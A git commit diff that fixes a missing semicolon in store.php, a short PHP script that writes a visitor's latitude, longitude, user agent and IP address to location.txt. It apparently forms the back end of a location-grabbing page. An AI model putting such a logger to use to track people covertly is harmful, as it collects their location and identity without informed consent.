cab5dab38b218d159f78da7117ec3ca38c90924a
AnnonymousMe <121399350+AnnonymousMe@users.noreply.github.com>
2022-12-27 23:39:40 +0530

    Update store.php

--- store.php
+++ store.php
@@ -1,5 +1,5 @@
 <?php
-$myfile = fopen("location.txt", "w")
+$myfile = fopen("location.txt", "w");
 $txt = "lat: " . $_GET["lat"] . "\nlong: " . $_GET["long"] . "\nIP: " . $_SERVER["REMOTE_ADDR"] . "\nuseragent: " . $_GET["uagent"];
 fwrite($myfile, $txt);
 fclose($myfile);
